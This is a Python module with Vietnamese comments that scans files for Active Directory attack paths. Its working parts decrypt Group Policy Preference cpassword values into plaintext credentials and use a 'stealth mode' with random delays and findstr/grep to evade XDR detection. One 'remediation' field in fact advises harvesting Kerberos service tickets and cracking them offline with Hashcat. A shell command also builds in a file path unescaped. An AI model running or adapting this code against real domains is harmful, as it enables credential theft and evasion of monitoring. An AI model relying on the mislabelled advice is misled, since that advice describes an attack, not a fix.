import os
import re
import time
import random
from colorama import Fore, Style

class ADScanner:
    """
    Module rà quét Active Directory (AD) & Lateral Movement (Tầng 12):
    - Vector 81: GPP Password Audit (SYSVOL)
    - Vector 83: Delegation & ACL Audit
    - Vector 86: SPN Harvesting (Kerberoasting)
    - Vector 87: Named Pipe Impersonation (SMB/RPC)
    - Vector 88: WMI/COM Lateral Movement
    """
    def __init__(self, target_path):
        self.target_path = target_path
        self.findings = []

    def scan(self, stealth_mode=True):
        print(f"  {Fore.CYAN}[-] Đang khởi động Module AD Dominion & Lateral Movement (Tầng 12)...{Style.RESET_ALL}")
        if stealth_mode:
            print(f"  {Fore.YELLOW}[!] Kích hoạt CHẾ ĐỘ TÀNG HÌNH (Stealth Mode). Đang sử dụng Jitter & LotL.{Style.RESET_ALL}")
        
        # 1. Thu hoạch SPNs từ chuỗi (Kerberoasting Discovery)
        self._harvest_spns(stealth_mode)
        
        # 2. Kiểm tra GPP Passwords (nếu có SYSVOL ảo/thật)
        self._audit_gpp_passwords(stealth_mode)
        
        # 3. Delegation Discovery
        self._audit_ad_delegation()
        
        # TÍNH NĂNG NÂNG CẤP X: Quét SMB Named Pipe & WMI (Lateral Movement)
        self._audit_lateral_movement_artifacts()

        return self.findings

    def _stealth_jitter(self):
        """Random delay để né tránh Behavioral Analysis của XDR."""
        delay = random.uniform(1.5, 4.5)
        time.sleep(delay)

    def _harvest_spns(self, stealth_mode=True):
        """Vector 86: Tìm kiếm SPN signatures dùng cho Kerberoasting."""
        spn_indicators = [
            r"MSSQLSvc/[^:]+:[0-9]+",
            r"HTTP/[^:]+:[0-9]+",
            r"TERMSRV/[^:]+",
            r"WSMAN/[^:]+",
        ]
        
        # TÍNH NĂNG NÂNG CẤP: Nhận diện Rubeus/Impacket Artifacts (Base64 Tickets/Kirbi)
        adv_ad_indicators = [
            r"(?i)doIE[A-Za-z0-9+/]{20,}", # ASN.1 TGT structure (Base64)
            r"krbtgt/[A-Za-z0-9\-\.]+"     # Target Kerberos SPN
        ]
        
        found_spns = []
        found_adv = []
        try:
            with open(self.target_path, "rb") as f:
                content = f.read().decode('ascii', errors='ignore')
                for pattern in spn_indicators:
                    matches = re.findall(pattern, content)
                    found_spns.extend(matches)
                for pattern in adv_ad_indicators:
                    matches = re.findall(pattern, content)
                    found_adv.extend(matches)
        except: pass

        if found_spns:
            print(f"  {Fore.RED}[CRITICAL] Phát hiện Service Principal Names (SPNs) trong binary!{Style.RESET_ALL}")
            print(f"  {Fore.RED}[!] Có thể dùng kỹ thuật Kerberoasting để bẻ khóa tài khoản Service.{Style.RESET_ALL}")
            self.findings.append({
                "id": "APS-VEC-086",
                "name": "SPN Discovery (Kerberoasting Path)",
                "severity": "CRITICAL",
                "privilege": "Standard User",
                "description": f"Tìm thấy các SPN tiềm năng: {', '.join(found_spns[:3])}. Tài khoản LDAP liên kết với các SPN này thường có mật khẩu yếu và không bao giờ đổi.",
                "remediation": "Sử dụng 'Request-SPNTicket' để thu hoạch vé TGS và crack offline (Hashcat mode 13100)."
            })

        if found_adv:
            print(f"  {Fore.RED}[CRITICAL] HỆ TƯ TƯỞNG RUBEUS/IMPACKET: Tìm thấy artifact Kerberos dạng vé!{Style.RESET_ALL}")
            self.findings.append({
                "id": "APS-VEC-083", # Ánh xạ Kerberoast / Delegation
                "name": "Kerberos Ticket Artifacts Detected",
                "severity": "CRITICAL",
                "privilege": "Administrator",
                "description": f"Binary đang nhúng cứng vé Kerberos (TGT/TGS) dạng chuỗi Base64: {', '.join(found_adv[:2])}..."
            })

    def _audit_lateral_movement_artifacts(self):
        """Vector 87 & 88: Kiểm tra dấu vết kết nối Mạng nội bộ qua SMB/WMI."""
        import re as stdre
        try:
            with open(self.target_path, "rb") as f:
                content = f.read().decode('ascii', errors='ignore')
                
                # 1. Tìm Named Pipes (\.\pipe\name) - Đặc trưng của C2 SMB/PsExec
                pipes = stdre.findall(r"\\\\\\\\\.\\\\pipe\\\\[A-Za-z0-9_-]+", content)
                pipes += stdre.findall(r"\\\\\.\\pipe\\[A-Za-z0-9_-]+", content)
                
                if pipes:
                    print(f"  {Fore.RED}[CRITICAL] SMB BEACONING: Tìm thấy dấu vết sử dụng Named Pipes!{Style.RESET_ALL}")
                    self.findings.append({
                        "id": "APS-VEC-087",
                        "name": "Named Pipe Impersonation (SMB Beacon/RPC)",
                        "severity": "CRITICAL",
                        "privilege": "System/Network",
                        "description": f"Phát hiện Endpoint Named Pipe: {', '.join(set(pipes))}. Mã độc/Công cụ này sử dụng SMB để liên lạc ngang (Lateral Movement) lẩn tránh Tường lửa mạng hoặc thực hiện Impersonation leo thang đặc quyền."
                    })

                # 2. Tìm WMI Namespaces/Query (Lateral Movement)
                wmi_hints = stdre.findall(r"(?i)(root\\cimv2|Win32_Process|IWbemServices|ExecMethod)", content)
                if len(set(wmi_hints)) >= 2:
                    print(f"  {Fore.RED}[HIGH] Phát hiện gọi WMI/DCOM (Lateral Movement Pattern)!{Style.RESET_ALL}")
                    self.findings.append({
                        "id": "APS-VEC-088",
                        "name": "WMI Abuse (Lateral Movement)",
                        "severity": "HIGH",
                        "privilege": "Administrator",
                        "description": f"Tìm thấy cấu trúc kết nối WMI ({', '.join(set(wmi_hints))}). Mã độc có thể dùng WMI để thực thi lệnh từ xa trên các máy chủ khác mà không ghi log tiến trình con trực tiếp."
                    })
        except: pass

    def _decrypt_gpp_password(self, cpassword):
        """Giải mã mật khẩu GPP sử dụng AES-256-CBC với key của Microsoft."""
        from Cryptodome.Cipher import AES
        import base64
        
        key = bytes([
            0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 
            0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 
            0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 
            0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b 
        ])
        iv = b"\x00" * 16
        
        try:
            # Padding cpassword
            padding = len(cpassword) % 4
            if padding > 0: cpassword += "=" * (4 - padding)
            
            decoded = base64.b64decode(cpassword)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(decoded)
            return decrypted.decode('utf-16le', errors='ignore').strip()
        except: return "Error Decrypting"

    def _audit_gpp_passwords(self, stealth_mode=True):
        """Vector 81: Quét và giải mã mật khẩu GPP với kỹ thuật LotL."""
        target_dir = os.path.dirname(os.path.abspath(self.target_path))
        
        if stealth_mode:
            # Sử dụng LotL (findstr/grep) thay vì open() trực tiếp để né XDR
            import subprocess
            is_windows = os.name == 'nt'
            lotl_tool = "findstr.exe" if is_windows else "grep"
            print(f"  {Fore.YELLOW}[*] Đang mượn danh '{lotl_tool}' để tìm kiếm GPP XML...{Style.RESET_ALL}")
            
            try:
                if is_windows:
                    cmd = f'findstr /S /M "cpassword" "{target_dir}\\*.xml"'
                else:
                    cmd = f'grep -r -l "cpassword" "{target_dir}" --include="*.xml"'
                
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                files = output.splitlines()
                
                if not files:
                    # Fallback nếu LotL không tìm thấy gì (có thể do đường dẫn)
                    pass 

                for file_path in files:
                    file_path = file_path.strip()
                    if not file_path: continue
                    self._stealth_jitter()
                    with open(file_path, 'r') as f:
                        content = f.read()
                        self._process_gpp_content(content, os.path.basename(file_path))
            except Exception as e:
                # Nếu LotL lỗi (vd: không có grep/findstr), dùng Python fallback
                self._python_fallback_scan(target_dir)
        else:
            self._python_fallback_scan(target_dir)

    def _python_fallback_scan(self, target_dir):
        """Quét bằng Python thuần nếu LotL không khả dụng."""
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if file.endswith(".xml"):
                    try:
                        with open(os.path.join(root, file), 'r') as f:
                            self._process_gpp_content(f.read(), file)
                    except: pass

    def _process_gpp_content(self, content, filename):
        if 'cpassword="' in content:
            cpass = re.search(r'cpassword="([^"]+)"', content).group(1)
            user = re.search(r'userName="([^"]+)"', content).group(1) if 'userName="' in content else "Unknown"
            plaintext = self._decrypt_gpp_password(cpass)
            
            print(f"  {Fore.RED}[CRITICAL] ĐÃ GIẢI MÃ MẬT KHẨU GPP (STEALTH)!{Style.RESET_ALL}")
            self.findings.append({
                "id": "AD-GPP-PWNED",
                "name": "DECRYPTED GPP PASSWORD",
                "severity": "CRITICAL",
                "privilege": "Administrator",
                "username": user,
                "password": plaintext,
                "description": f"Đã trích xuất mật khẩu cho '{user}' từ file {filename} bằng kỹ thuật LotL.",
                "is_vault_item": True
            })

    def _audit_ad_delegation(self):
        """Vector 83: Phát hiện logic ủy quyền (Delegation)."""
        delegation_apis = [b"InitializeSecurityContext", b"AcceptSecurityContext", b"AcquireCredentialsHandle"]
        found = []
        try:
            with open(self.target_path, "rb") as f:
                content = f.read()
                for api in delegation_apis:
                    if api in content:
                        found.append(api.decode())
        except: pass

        if found:
            self.findings.append({
                "id": "AD-DEL-083",
                "name": "Insecure Delegation Usage",
                "severity": "HIGH",
                "privilege": "Standard User",
                "description": f"Ứng dụng sử dụng các API ủy quyền nhạy cảm: {', '.join(found)}. Nguy cơ bị tấn công 'Unconstrained Delegation' để chiếm Token Admin domain."
            })
